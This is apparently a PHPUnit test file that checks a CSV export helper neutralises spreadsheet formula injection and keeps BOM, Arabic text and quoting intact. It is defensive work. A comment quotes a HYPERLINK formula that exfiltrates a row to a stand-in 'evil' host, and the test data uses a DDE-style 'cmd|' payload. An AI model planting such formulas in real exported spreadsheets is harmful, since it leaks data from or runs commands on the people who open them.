<?php

namespace Tests\Feature\Build;

use App\Support\Csv;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * P1c Task 8 (Decision F). `App\Support\Csv` is the first and only CSV writer in this codebase
 * (finding 16) — a greenfield choice rather than a retrofit, which is why formula-injection
 * neutralisation gets to be right from the first commit instead of bolted on later.
 *
 * THE THREAT: a cell whose first character is `=`, `+`, `-`, `@`, TAB or CR is executed as a
 * formula by Excel, LibreOffice and Google Sheets when the file is opened —
 * `=HYPERLINK("http://evil/?"&A1)` exfiltrates the row it sits in with one click on a "this file
 * contains links" prompt. A roster export contains staff-supplied names and notes, so this is not
 * a theoretical column.
 *
 * THE PAIRING: `App\Support\Roster\CsvRosterReader` (Task 11) strips exactly one leading
 * apostrophe from a cell that would otherwise begin with one of the six dangerous characters, so
 * export -> re-import is lossless. Without the pairing, a round trip silently renames `=Ward` to
 * `'=Ward` and does it again on every subsequent trip.
 * `test_a_neutralised_cell_round_trips_through_the_reader` is written now, skipped until
 * CsvRosterReader exists, because the reader's contract is set by the writer here, not the other
 * way round.
 */
class CsvInjectionTest extends TestCase
{
    /**
     * @return array<string, array{0: string}>
     */
    public static function dangerousLeadingCharacters(): array
    {
        return [
            'equals' => ['='],
            'plus' => ['+'],
            'minus' => ['-'],
            'at' => ['@'],
            'tab' => ["\t"],
            'carriage return' => ["\r"],
        ];
    }

    #[DataProvider('dangerousLeadingCharacters')]
    public function test_every_dangerous_leading_character_is_neutralised(string $prefix): void
    {
        $this->assertSame("'".$prefix.'cmd|somewhere!A1', Csv::neutralise($prefix.'cmd|somewhere!A1'));
    }

    /** Over-escaping is its own bug: an `=` that is not LEADING must survive untouched. */
    public function test_an_ordinary_cell_is_untouched(): void
    {
        $this->assertSame('a=b', Csv::neutralise('a=b'));
        $this->assertSame('Dr Ward', Csv::neutralise('Dr Ward'));
        $this->assertSame('', Csv::neutralise(''));
        $this->assertSame('', Csv::neutralise(null));
    }

    /**
     * Without the BOM, Excel decodes UTF-8 as the system codepage and Arabic names open as
     * mojibake — the operator's reasonable conclusion is that the system corrupted them.
     */
    public function test_a_utf8_bom_is_written_first(): void
    {
        $response = Csv::stream('roster.csv', ['Name'], [['Ward']]);
        $content = $this->captureStream($response);

        $this->assertSame("\xEF\xBB\xBF", substr($content, 0, 3));
    }

    public function test_arabic_content_round_trips_byte_identical(): void
    {
        $name = 'محمد العتيبي';

        $response = Csv::stream('roster.csv', ['Name'], [[$name]]);
        $content = $this->captureStream($response);

        $this->assertStringContainsString($name, $content);
    }

    /**
     * The pairing contract this writer sets for `CsvRosterReader` (Task 11): a dangerous cell
     * comes out prefixed with exactly one apostrophe, and the reader strips exactly one back off.
     */
    public function test_a_neutralised_cell_round_trips_through_the_reader(): void
    {
        if (! class_exists(\App\Support\Roster\CsvRosterReader::class)) {
            $this->markTestSkipped('CsvRosterReader lands in Task 11 — this is the pairing contract it must satisfy.');
        }

        $response = Csv::stream('roster.csv', ['Formula'], [['=SUM(A1)']]);
        $content = $this->captureStream($response);

        $tmp = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tmp, $content);

        $reader = new \App\Support\Roster\CsvRosterReader($tmp);
        $rows = iterator_to_array($reader->rows());

        @unlink($tmp);

        $this->assertSame('=SUM(A1)', $rows[0]['Formula']);
    }

    public function test_embedded_newlines_and_quotes_survive(): void
    {
        $cell = "line one\nline two \"quoted\"";

        $response = Csv::stream('roster.csv', ['Notes'], [[$cell]]);
        $content = $this->captureStream($response);

        // fputcsv's own quoting: embedded double-quotes are doubled, the whole field wrapped in
        // quotes. Parse it back with the same primitive rather than asserting on raw bytes, which
        // would just re-implement RFC 4180 badly.
        $tmp = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tmp, $content);
        $handle = fopen($tmp, 'r');
        // Skip the BOM.
        fread($handle, 3);
        fgetcsv($handle); // header row
        $row = fgetcsv($handle);
        fclose($handle);
        @unlink($tmp);

        $this->assertSame($cell, $row[0]);
    }

    private function captureStream(\Symfony\Component\HttpFoundation\StreamedResponse $response): string
    {
        ob_start();
        $response->sendContent();

        return ob_get_clean();
    }
}
